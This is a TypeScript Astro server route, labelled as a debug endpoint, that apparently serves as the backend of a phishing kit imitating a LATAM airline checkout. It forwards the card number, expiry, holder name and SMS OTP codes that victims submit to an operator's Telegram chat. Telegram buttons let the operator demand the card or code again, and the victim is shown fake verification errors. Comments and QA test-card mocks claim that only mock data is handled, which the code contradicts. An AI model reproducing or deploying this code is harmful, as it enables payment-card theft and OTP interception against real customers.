export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved';

type RouteDecision = {
  action: RouteAction;
  brand?: string;
  message?: string;
  updatedAt?: string;
};

type DebugSession = {
  decision?: RouteDecision;
  steps: Set<string>;
  payload?: Record<string, unknown>;
};

const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';

const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
  '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
  '4': { brand: 'visa', pan: '4111111111111111', exp: '12/30', cvv: '123', holder: 'QA VISA MOCK' },
  '5': { brand: 'mastercard', pan: '5555555555554444', exp: '12/30', cvv: '123', holder: 'QA MC MOCK' },
  '6': { brand: 'discover', pan: '6011111111111117', exp: '12/30', cvv: '123', holder: 'QA DISCOVER MOCK' },
};

// Estado efimero por instancia serverless/dev: guarda la decision elegida en Telegram
// los pasos ya pedidos y el ultimo payload recibido por sessionId.
const globals = globalThis as typeof globalThis & {
  __latamDebugSessions?: Map<string, DebugSession>;
  __latamDebugTelegramOffset?: number;
};
const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
globals.__latamDebugSessions = sessions;

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function cleanSessionId(value: unknown) {
  const id = String(value || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 80);
  return id || crypto.randomUUID();
}

function cardMockForFirstDigit(value: unknown) {
  const first = String(value || '').replace(/\D/g, '').charAt(0);
  return CARD_MOCKS[first] || CARD_MOCKS['4'];
}

// Lee secretos solo desde backend. Estos valores no se importan en scripts de navegador.
function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

function getSession(sessionId: string) {
  const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
  sessions.set(sessionId, session);
  return session;
}

function objectValue(value: unknown) {
  return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
}

function rememberStep(sessionId: string, step: string) {
  getSession(sessionId).steps.add(step);
}

function hasStep(sessionId: string, step: string) {
  return getSession(sessionId).steps.has(step);
}

// Traduce un boton de Telegram en una decision consumible por el frontend.
// Tambien aplica reglas de repeticion para tarjeta/SMS dentro de la misma sesion.
function makeDecision(sessionId: string, action: RouteAction, brand?: string): RouteDecision {
  if (action === 'card') {
    if (hasStep(sessionId, 'card')) {
      getSession(sessionId).steps = new Set(['card']);
      return {
        action: 'card_error',
        brand,
        message: 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'card');
  }

  if (action === 'sms') {
    if (hasStep(sessionId, 'sms')) {
      return {
        action: 'sms_error',
        brand,
        message: SMS_INVALID_MESSAGE,
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'sms');
  }

  return { action, brand, updatedAt: new Date().toISOString() };
}

function actionLabel(action: RouteAction) {
  const labels: Record<RouteAction, string> = {
    wait: 'Esperando operador',
    sms: 'Enviar a SMS',
    card: 'Pedir tarjeta',
    sms_error: 'Error SMS repetido',
    card_error: 'Error tarjeta repetida',
    approved: 'Aprobado mock',
  };
  return labels[action] || action;
}

function isProcessingEvent(event: unknown) {
  return event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT';
}

function stepLabel(event: unknown, meta?: Record<string, unknown>) {
  if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
  const labels: Record<string, string> = {
    P1: 'Inicio / reserva',
    P2: 'Eligiendo vuelos',
    P3: 'Resumen del viaje',
    P4: 'Datos de pasajeros',
    'P-PAYMENT': 'Página de pago',
    'P-SUCCESS': 'Compra confirmada',
    PAYMENT_SUBMIT: 'Pago en proceso',
    OTP_SUBMIT: 'Envió código OTP',
  };
  return labels[String(event || '')] || String(event || '-');
}

function keyboard(sessionId: string, brand: string) {
  return {
    inline_keyboard: [
      [{ text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` }],
      [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
      [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
    ],
  };
}

function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, unknown>) {
  const labeled = meta.amountLabel ?? payload.amountLabel;
  if (typeof labeled === 'string' && labeled.trim()) return labeled.trim();
  const raw = meta.amount ?? payload.amount;
  const n = Number(raw);
  if (Number.isFinite(n) && String(raw) !== '') {
    return `USD ${n.toFixed(2).replace('.', ',')}`;
  }
  return '-';
}

function formatStepMessage(payload: Record<string, unknown>) {
  const meta = objectValue(payload.meta) || {};
  return stepLabel(payload.event, meta);
}

function formatPaymentMessage(payload: Record<string, unknown>) {
  const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
  const meta = objectValue(payload.meta) || {};
  const metaOtp = objectValue(payload.metaOtp) || {};
  const stepMeta = payload.event === 'OTP_SUBMIT' ? { ...meta, ...metaOtp } : meta;
  const cpayload = objectValue(meta.cpayload) || {};
  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
  return [
    '✈️ LATAM PANEL',
    '━━━━━━━━━━━━━━━━━━',
    `📍 ${stepLabel(payload.event, stepMeta)}`,
    `🆔 Sesión: ${payload.sessionId || '-'}`,
    `💵 Monto: ${formatPenAmount(meta, payload)}`,
    '',
    '💳 DATOS DE PAGO',
    `🏷️ Marca: ${brand.toUpperCase()}`,
    `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
    `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
    `👤 Titular: ${cpayload.holder || '-'}`,
    '',
    '💰 OTP',
    `💵 Código: ${metaOtp.otp || '-'}`,
    '━━━━━━━━━━━━━━━━━━',
  ].join('\n');
}

function formatTelegramMessage(payload: Record<string, unknown>) {
  return isProcessingEvent(payload.event) ? formatPaymentMessage(payload) : formatStepMessage(payload);
}

// Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
async function telegramApi(method: string, payload: Record<string, unknown>) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing' };
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return { ok: response.ok, status: response.status };
}

// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
// el frontend hace polling al endpoint GET /api/debug.
async function telegramGetUpdates() {
  const { token } = telegramConfig();
  if (!token) return [];
  const offset = globals.__latamDebugTelegramOffset;
  const qs = new URLSearchParams({
    timeout: '0',
    allowed_updates: JSON.stringify(['callback_query']),
  });
  if (typeof offset === 'number') qs.set('offset', String(offset));
  const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
    headers: { Accept: 'application/json' },
  });
  if (!response.ok) return [];
  const payload = await response.json();
  return Array.isArray(payload?.result) ? payload.result : [];
}

// Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
  const { chatId } = telegramConfig();
  if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const sessionId = String(payload.sessionId || '');
  const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
  const message: Record<string, unknown> = {
    chat_id: chatId,
    text: formatTelegramMessage(payload),
    disable_web_page_preview: true,
  };
  if (options.withButtons) {
    message.reply_markup = keyboard(sessionId, brand);
  }
  const result = await telegramApi('sendMessage', message);
  return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
}

// Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
// Al usarse un boton, quita el teclado inline para evitar decisiones duplicadas.
async function handleTelegramCallback(body: Record<string, unknown>) {
  const callback = body.callback_query as Record<string, unknown> | undefined;
  const data = String(callback?.data || '');
  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]+)$/);
  if (!match) return json({ ok: true, ignored: true });

  const [, rawSessionId, rawAction, rawBrand] = match;
  const sessionId = cleanSessionId(rawSessionId);
  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand);
  getSession(sessionId).decision = decision;

  const message = callback?.message as Record<string, unknown> | undefined;
  if (message?.chat && typeof message.message_id === 'number') {
    const chat = message.chat as Record<string, unknown>;
    await telegramApi('editMessageReplyMarkup', {
      chat_id: chat.id,
      message_id: message.message_id,
      reply_markup: { inline_keyboard: [] },
    });
  }

  if (callback?.id) {
    await telegramApi('answerCallbackQuery', {
      callback_query_id: callback.id,
      text: actionLabel(decision.action),
      show_alert: false,
    });
  }

  return json({ ok: true, sessionId, decision });
}

// Sincroniza callbacks pendientes antes de responder al polling del navegador.
async function syncTelegramCallbacks() {
  const updates = await telegramGetUpdates();
  for (const update of updates) {
    if (typeof update?.update_id === 'number') {
      globals.__latamDebugTelegramOffset = update.update_id + 1;
    }
    if (update?.callback_query) {
      await handleTelegramCallback({ callback_query: update.callback_query });
    }
  }
}

// El frontend consulta este endpoint mientras muestra loader, esperando la decision
// que el operador eligio en Telegram para esta sessionId.
export const GET: APIRoute = async ({ url }) => {
  const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
  await syncTelegramCallbacks();
  return json({ sessionId, decision: getSession(sessionId).decision || { action: 'wait' } });
};

// Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
// el cliente envia datos mock/enmascarados y este endpoint arma el mensaje operativo.
export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  if (body.callback_query) return handleTelegramCallback(body);

  console.info('[debug-api:body]', body);

  const event = String(body.event || '') as DebugEvent;
  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT']);
  if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });

  const sessionId = cleanSessionId(body.sessionId);
  const session = getSession(sessionId);
  const previousPayload = session.payload;
  const previousMeta = objectValue(previousPayload?.meta);
  const previousMetaOtp = objectValue(previousPayload?.metaOtp);
  const incomingMeta = objectValue(body.meta);
  const incomingMetaOtp = objectValue(body.metaOtp);
  const mockCard = event === 'PAYMENT_SUBMIT' ? cardMockForFirstDigit(body.cardFirstDigit) : undefined;
  const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
  if (event === 'PAYMENT_SUBMIT') {
    rememberStep(sessionId, 'card');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
  }
  if (event === 'OTP_SUBMIT') {
    rememberStep(sessionId, 'sms');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
  }

  const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
  const payload = {
    sessionId,
    event,
    route: String(body.route || ''),
    createdAt: new Date().toISOString(),
    brand,
    amount: meta.amount ?? previousMeta?.amount,
    amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
    meta,
    metaOtp: incomingMetaOtp || previousMetaOtp || {},
    action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
    mockCard,
  };

  console.info('[debug-api]', payload);
  session.payload = payload;
  const telegram = event === 'P-SUCCESS'
    ? { sent: false, skipped: 'success-page' }
    : await sendTelegram(payload, { withButtons: isProcessingEvent(event) });

  return json({ ...payload, telegram });
};
